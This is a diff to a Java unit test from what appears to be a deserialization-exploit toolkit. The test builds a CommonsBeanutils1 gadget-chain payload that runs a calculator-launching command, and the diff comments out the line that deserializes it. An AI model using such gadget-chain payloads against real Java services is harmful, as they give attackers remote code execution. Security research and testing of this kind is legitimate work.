@@ -19,6 +19,6 @@ public class CommonsBeanutils1Test {
         Bullet bullet = payload.getDefaultBullet("open /System/Applications/Calculator.app");
         payload.setBullet(bullet);
         Serializer serializer = payload.getSerializer();
-        serializer.deserialize(serializer.serialize(payload.getObject()));
+//        serializer.deserialize(serializer.serialize(payload.getObject()));
     }
 }
